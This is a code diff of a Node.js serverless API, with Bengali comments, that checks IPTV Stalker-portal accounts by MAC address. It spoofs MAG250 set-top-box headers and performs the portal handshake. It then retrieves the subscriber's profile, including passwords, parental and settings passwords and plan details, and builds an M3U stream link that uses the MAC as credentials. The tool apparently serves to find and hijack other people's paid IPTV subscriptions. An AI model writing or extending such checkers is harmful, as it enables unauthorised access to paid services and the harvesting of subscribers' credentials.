@@ -1,38 +1,20 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    // ১. CORS সেটআপ (যাতে ব্রাউজার থেকে রিকোয়েস্ট ব্লক না হয়)
-    res.setHeader('Access-Control-Allow-Credentials', true);
+    // CORS & Method Check
     res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
-    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
+    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-    // ২. প্রি-ফ্লাইট রিকোয়েস্ট হ্যান্ডেলিং
-    if (req.method === 'OPTIONS') {
-        res.status(200).end();
-        return;
-    }
+    if (req.method === 'OPTIONS') return res.status(200).end();
+    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method Not Allowed' });
 
-    // ৩. মেথড চেক (শুধুমাত্র POST বা GET এলাউড, যাতে ব্রাউজারে ক্র্যাশ না করে)
-    if (req.method === 'GET') {
-        return res.status(200).json({ status: "API is Running ✅", message: "Please use POST method with host & mac" });
-    }
-
-    if (req.method !== 'POST') {
-        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
-    }
-
-    // ৪. মেইন লজিক
     const { host, mac } = req.body;
-
-    if (!host || !mac) {
-        return res.status(400).json({ success: false, message: 'Missing Host or MAC Address' });
-    }
+    if (!host || !mac) return res.status(400).json({ success: false, message: 'Missing Host or MAC' });
 
     try {
         const cleanHost = host.endsWith('/') ? host : `${host}/`;
         
-        // Stalker Portal স্পুফিং হেডার
         const headers = {
             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
             'Cookie': `mac=${mac}; stb_lang=en; timezone=Europe/Paris;`,
@@ -41,41 +23,71 @@ module.exports = async (req, res) => {
             'X-User-Agent': 'Model: MAG250; Link: Ethernet'
         };
 
-        const targetUrl = `${cleanHost}portal.php?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml`;
-
-        // রিকোয়েস্ট পাঠানো (টাইমআউট ৫ সেকেন্ড)
-        const response = await axios.get(targetUrl, { headers, timeout: 5000 });
-        const data = response.data;
-
-        // রেসপন্স চেক
-        if (data && data.js && data.js.token) {
-            // M3U লিংক জেনারেট
-            const m3uLink = `${cleanHost}get.php?username=${mac}&password=${mac}&type=m3u_plus&output=ts`;
-            
-            return res.json({
-                success: true,
-                message: 'Active Account ✅',
-                data: {
-                    mac: mac,
-                    token: data.js.token,
-                    expiry: 'Check Profile for Details',
-                    m3u: m3uLink
-                }
-            });
-        } else {
-            return res.json({
-                success: false,
-                message: 'Inactive / Invalid Response ❌',
-                raw_data: data
-            });
+        // ১. Handshake
+        const handUrl = `${cleanHost}portal.php?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml`;
+        const handRes = await axios.get(handUrl, { headers, timeout: 6000 });
+        
+        if (!handRes.data?.js?.token) {
+            return res.json({ success: false, message: 'MAC Dead / Invalid Host ❌' });
         }
 
-    } catch (error) {
-        console.error(error);
-        return res.status(500).json({ 
-            success: false, 
-            message: 'Server Error / Connection Failed', 
-            error: error.message 
+        const token = handRes.data.js.token;
+        const authHeaders = { ...headers, 'Authorization': `Bearer ${token}` };
+
+        // ২. সব তথ্য একসাথে আনা (Profile + Main Info + Categories)
+        const [profileRes, mainInfoRes, liveRes, vodRes, seriesRes] = await Promise.all([
+            axios.get(`${cleanHost}portal.php?type=stb&action=get_profile&JsHttpRequest=1-xml`, { headers: authHeaders }),
+            axios.get(`${cleanHost}portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml`, { headers: authHeaders }),
+            axios.get(`${cleanHost}portal.php?type=itv&action=get_genres&JsHttpRequest=1-xml`, { headers: authHeaders }),
+            axios.get(`${cleanHost}portal.php?type=vod&action=get_categories&JsHttpRequest=1-xml`, { headers: authHeaders }),
+            axios.get(`${cleanHost}portal.php?type=series&action=get_categories&JsHttpRequest=1-xml`, { headers: authHeaders })
+        ]);
+
+        const p = profileRes.data?.js || {};     // Profile Data
+        const m = mainInfoRes.data?.js || {};    // Main Info (Max Online here)
+        
+        const m3uLink = `${cleanHost}get.php?username=${mac}&password=${mac}&type=m3u_plus&output=ts`;
+
+        // ক্যাটাগরি প্রসেসিং
+        const extractTitles = (data) => {
+            if (data?.js && Array.isArray(data.js)) {
+                return data.js.map(item => item.title).slice(0, 10); // UI ক্লিন রাখতে ১০টা দেখাবে
+            }
+            return [];
+        };
+
+        return res.json({
+            success: true,
+            message: 'Active Account ✅',
+            data: {
+                // Basic Info
+                mac: mac,
+                expiry: p.phone || p.end_date || 'Unlimited',
+                created: p.created || 'Unknown',
+                
+                // Advanced Info (আপনার চাওয়া লিস্ট)
+                username: p.fname || p.login || p.name || 'N/A',
+                password: p.password || 'N/A',
+                adult_pass: p.parent_password || '0000',
+                tariff_id: p.tariff_plan_id || 'N/A',
+                plan_name: m.phone || p.package_name || 'N/A', // অনেক সময় Plan Name ফোনে থাকে
+                max_online: m.max_online || '1', // ডিফল্ট ১
+                stb_type: p.stb_type || 'MAG250',
+                country: p.country || p.locale || 'N/A',
+                settings_pass: p.settings_password || 'N/A',
+                comment: p.comment || 'No Comment',
+
+                // Tools
+                m3u: m3uLink,
+                
+                // Content Lists
+                liveCategories: extractTitles(liveRes.data),
+                vodCategories: extractTitles(vodRes.data),
+                seriesCategories: extractTitles(seriesRes.data)
+            }
         });
+
+    } catch (error) {
+        return res.status(500).json({ success: false, message: 'Connection Failed', error: error.message });
     }
 };
